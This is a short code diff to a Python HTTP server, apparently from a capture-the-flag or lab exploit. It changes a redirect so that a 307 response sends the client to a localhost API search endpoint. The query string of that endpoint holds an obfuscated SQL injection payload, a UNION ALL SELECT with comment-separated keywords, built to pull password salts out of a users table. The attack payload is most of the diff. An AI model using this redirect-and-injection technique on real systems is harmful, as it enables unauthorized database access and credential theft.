@@ -24,7 +24,8 @@ class BaseServer(BaseHTTPRequestHandler):
 
     def redirect(self):
         self.send_response(307)
-        self.send_header('Location',"http://127.0.0.1--REDACTED--")
+        #self.send_header('Location',"http://127.0.0.1--REDACTED--")
+        self.send_header('Location',"http://127.0.0.1:3000/api/v1/users/search?q=%27)/**/union/**/all/**/select/**/null,null,salt,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null")
         self.end_headers()
 
 
